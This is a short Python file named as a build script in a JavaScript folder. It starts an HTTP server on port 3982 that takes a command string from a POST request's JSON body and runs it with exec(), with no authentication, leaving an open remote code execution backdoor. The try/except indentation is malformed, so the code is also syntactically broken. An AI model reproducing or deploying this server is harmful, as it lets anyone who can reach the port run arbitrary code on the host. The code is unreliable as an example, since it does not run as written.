# js/node/connect/build.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        try:
           parsed_body = json.loads(body)
        command = parsed_body['cmd']['command']  # コマンドを取得
        result = exec(command)  # コマンドを実行
        print('Command Result:', result)  # 結果を表示
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Pycmd-Server:Command executed successfully')
        except json.JSONDecodeError as error:
            print('JSON parse error:', error)
            self.send_response(400)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Pycmd-Server:Invalid JSON data.')

def run(server_class=HTTPServer, handler_class=RequestHandler, port=3982):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Server Running at {port}')
    httpd.serve_forever()